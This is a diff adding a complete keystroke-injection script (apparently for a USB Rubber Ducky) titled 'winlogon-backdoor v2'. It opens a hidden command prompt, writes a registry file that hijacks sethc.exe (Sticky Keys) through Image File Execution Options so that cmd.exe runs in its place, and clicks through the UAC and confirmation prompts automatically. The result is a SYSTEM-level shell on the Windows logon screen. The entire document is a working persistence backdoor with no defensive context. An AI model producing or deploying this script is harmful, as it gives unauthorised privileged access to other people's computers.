@@ -1,0 +1,44 @@
+REM winlogon-backdoor v2
+REM Makes a command prompt available on the logon screen that will close automatically after 3mins or so and has system privileges.
+REM Press Left Alt + Left Shift + Print Screen on the logon screen to access the prompt.
+DELAY 5000
+REM Open the run dialog
+GUI r
+DELAY 300
+REM Open cmd with some extra flags
+STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
+ENTER
+DELAY 100
+ALT SPACE
+STRING M
+DOWN
+REPEAT 100
+ENTER
+REM Create a .reg file
+STRING copy con /Y %localappdata%\Temp\winlogonbd.reg
+ENTER
+DELAY 100
+STRING Windows Registry Editor Version 5.00
+ENTER
+REPEAT 1
+STRING [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe]
+ENTER
+STRING "Debugger"="C:\\Windows\\system32\\cmd.exe"
+CTRL z
+ENTER
+DELAY 100
+REM Open the .reg file
+STRING call %localappdata%\Temp\winlogonbd.reg & exit
+ENTER
+REM Wait for UAC
+DELAY 600
+REM Accept UAC
+ALT y
+REM Wait for confirmation dialog
+DELAY 600
+REM Accept confirmation dialog
+ALT y
+REM Wait for "successful" infobox
+DELAY 600
+REM Close it ("OK" is highlighted by default)
+ENTER
